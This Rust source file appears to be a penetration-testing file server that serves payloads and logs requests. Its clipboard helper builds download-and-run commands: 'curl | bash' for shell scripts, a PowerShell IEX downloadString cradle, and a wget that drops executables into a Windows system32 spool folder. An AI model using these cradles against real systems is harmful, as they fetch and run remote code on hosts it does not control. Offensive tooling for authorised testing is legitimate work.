#![feature(absolute_path)]

extern crate rouille;

use std::{fs, io};
use std::collections::HashMap;
use std::error::Error;
use std::fmt::Debug;
use std::io::{Read, Write};
use std::net::TcpListener;
use std::path::PathBuf;
use std::string::String;

use ansi_term::Color::{Blue, Yellow};
use ansi_term::Style;
use chrono;
use chrono::Utc;
use clap::{arg, Parser};
use cli_clipboard::{ClipboardContext, ClipboardProvider};
use network_interface::{NetworkInterface, NetworkInterfaceConfig};
use rouille::{Request, Response};

mod config;
mod log;
mod ssl_util;
mod ext_ip;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Specify alternate bind address
    #[arg(short, long)]
    bind: Option<String>,

    /// File or folder to serve
    #[clap(value_name = "ASSET", index = 1, required = false)]
    asset: String,

    /// Specify alternate port
    #[clap(value_name = "PORT", index = 2, required = false)]
    port: Option<u16>,

    /// Specify status code
    #[arg(short, long, required = false)]
    status_code: Option<u16>,

    /// Use ssl
    #[arg(long, required = false, default_value_t = false)]
    ssl: bool,

    /// Verbose output
    #[arg(short = 'v', long, required = false, default_value_t = false)]
    verbose: bool,

    /// Set headers
    #[arg(short = 'H', long, value_parser = parse_key_val::< String, String >)]
    header: Vec<(String, String)>,

    /// Match and replace functions
    #[arg(short, value_parser = parse_key_val::< String, String >)]
    replace_map: Vec<(String, String)>,

    /// Set permanent redirect to specified location
    #[arg(short = 'R', long)]
    redirect: Option<String>,
}

fn port_is_available(bind_addr: &str, port: u16) -> bool {
    match TcpListener::bind((bind_addr, port)) {
        Ok(_) => true,
        Err(_) => false,
    }
}

fn get_available_port(bind_addr: &str, ports_to_check: Vec<u16>) -> Option<u16> {
    ports_to_check.into_iter().find(|port| port_is_available(bind_addr, *port))
}

fn get_ip_from_interface_name(name: &str) -> Option<String> {
    let network_interfaces = NetworkInterface::show().unwrap();

    for ni in &network_interfaces {
        if ni.name == name {
            return Some(ni.addr.unwrap().ip().to_string());
        }
    }
    None
}


fn main() {
    // Parse command line
    let args = Args::parse();

    let mut bind_addr_print: String = String::new();

    let mut bind_addr: String = String::new();

    if args.bind.is_some() {
        bind_addr = args.bind.unwrap();

        match get_ip_from_interface_name(&bind_addr) {
            None => {}
            Some(ip) => {
                bind_addr = ip;
            }
        }
        bind_addr_print = bind_addr.clone();
    } else if config::bind().is_empty() {
        bind_addr_print = ext_ip::get_ext_ip();
        bind_addr = String::from("0.0.0.0");
    } else {
        for b in config::bind() {
            if b == "external" {
                bind_addr_print = ext_ip::get_ext_ip();
                bind_addr = String::from("0.0.0.0");
                break;
            } else {
                match get_ip_from_interface_name(b) {
                    None => {}
                    Some(ip) => {
                        bind_addr_print = ip.to_string();
                        bind_addr = bind_addr_print.clone();
                        break;
                    }
                }
            }
        }
    }

    let port = args.port;

    let mut ports_to_check: Vec<u16> = vec![];

    if port.is_some() {
        ports_to_check.push(port.unwrap());
    }

    // Fallback ports
    for i in config::fallback_ports()
    {
        if !ports_to_check.contains(&i) {
            ports_to_check.push(i);
        }
    }

    if ports_to_check.is_empty() {
        log::exit_msg("No fallback ports defined!");
        return;
    }

    // Check open port
    let port = get_available_port(&bind_addr, ports_to_check);

    if port.is_none() {
        log::exit_msg("No port is available!");
        return;
    }

    let port = port.unwrap();

    let status_code = args.status_code;

    let bind_addr = format!("{bind_addr}:{port}");

    let protocol = "http".to_owned() + (if args.ssl { "s" } else { "" });

    let server_addr = format!("{protocol}://{bind_addr_print}:{port}");

    let asset_str = config::resolve_aliases(&args.asset);

    let asset_path = PathBuf::from(asset_str);

    let asset_str = asset_path.display().to_string();

    let replace_map = args.replace_map;

    let headers = args.header;

    let redirect_location = args.redirect;

    let verbose = args.verbose;

    println!("Serving {} at {}", Yellow.paint(&asset_str), server_addr);

    // Suggest copy to clipboard
    if asset_path.is_file() {
        let file_name = asset_path.file_name().unwrap().to_str().unwrap();

        let copy_str: String;

        if asset_str.ends_with(".sh") {
            copy_str = format!("curl -k -s {server_addr} | bash");
        } else if asset_str.ends_with(".ps1") {
            copy_str = format!("IEX(New-Object Net.Webclient).downloadString(\"{server_addr}\")");
        } else if asset_str.ends_with(".exe") || asset_str.ends_with(".msi") {
            copy_str = format!("wget {server_addr} -O \\Windows\\system32\\spool\\drivers\\color\\{file_name}");
        } else {
            copy_str = format!("wget {server_addr} -O /tmp/{file_name}");
        }

        do_copy(copy_str);
    }


    let handler = move |request: &Request| {
        let mut response: Response;

        let now = Utc::now();

        if redirect_location.is_some() {
            response = Response::redirect_302(redirect_location.clone().unwrap());
        } else {
            let mut return_code = status_code.clone();

            if asset_path.is_file() {
                response = send_file_as_response(&asset_path, &replace_map);
                return_code = Some(200);
            } else {
                response = rouille::match_assets(&request, asset_path.as_path());
                if !response.is_success() {
                    let mut r_map = HashMap::new();
                    r_map.insert("error", "no match found");

                    response = Response::json(
                        &r_map,
                    )
                } else {
                    return_code = Some(200);
                }
            }

            response = response.with_status_code(match return_code {
                Some(return_code) => return_code,
                None => { 404 }
            });
        }

        for (k, v) in &headers {
            response = response.with_additional_header(k.clone(), v.clone());
        }

        println!("{} - - [{}] \"{} {}\" {}", Style::new().bold().paint(request.remote_addr().ip().to_string()), now.format("%d/%b/%Y %T"), request.method(), request.raw_url(), response.status_code);

        if verbose {
            let mut main_request_str = String::from("");

            main_request_str.push_str(request.method());
            main_request_str.push_str(" ");
            main_request_str.push_str(request.raw_url());
            main_request_str.push_str("\n");

            for header in request.headers() {
                main_request_str.push_str(header.0);
                main_request_str.push_str(": ");
                main_request_str.push_str(header.1);
                main_request_str.push_str("\n");
            }

            main_request_str.pop();

            let data = request.data();
            if data.is_some() {
                let mut body_buffer: String = String::new();

                match data.unwrap().read_to_string(&mut body_buffer) {
                    Ok(_) => {}
                    Err(_) => {}
                };

                if !
                    body_buffer.is_empty() {
                    main_request_str.push_str("\n\n");
                    main_request_str.push_str(&*body_buffer);
                }
            }

            println!("\n<!---------- Request Start ----------\n\n{}\n\n----------  Request End  ----------!>\n", main_request_str);
        }

        response
    };

    if args.ssl {
        let cert_pair = ssl_util::create_cert_pair();
        rouille::Server::new_ssl(bind_addr, handler, cert_pair.0, cert_pair.1).unwrap().run();
    } else {
        rouille::Server::new(bind_addr, handler).unwrap().run();
    }
}

fn do_copy(copy_str: String) {
    let mut ctx = ClipboardContext::new().unwrap();

    ctx.set_contents(copy_str.to_owned()).unwrap();

    let copied = ctx.get_contents().unwrap();

    println!("Copied '{}' to clipboard", Blue.paint(copied));
    io::stdout().flush().unwrap();
}

fn send_file_as_response(path: &PathBuf, replace_map: &Vec<(String, String)>) -> Response {
    match fs::read_to_string(path) {
        Ok(mut text) => {
            for (k, v) in replace_map {
                text = text.replace(k, v);
            }
            Response::text(text)
        }
        Err(_) => {
            let mut r_map = HashMap::new();
            r_map.insert("error", "error reading file");
            Response::json(&r_map)
        }
    }
}


/// Parse a single key-value pair
fn parse_key_val<T, U>(s: &str) -> Result<(T, U), Box<dyn Error + Send + Sync + 'static>>
    where
        T: std::str::FromStr,
        T::Err: Error + Send + Sync + 'static,
        U: std::str::FromStr,
        U::Err: Error + Send + Sync + 'static,
{
    let delim = ':';
    let pos = s
        .find(delim)
        .ok_or_else(|| format!("Invalid KEY VALUE pair: no `{}` found in `{}`", delim, s))?;
    Ok((s[..pos].parse()?, s[pos + 1..].parse()?))
}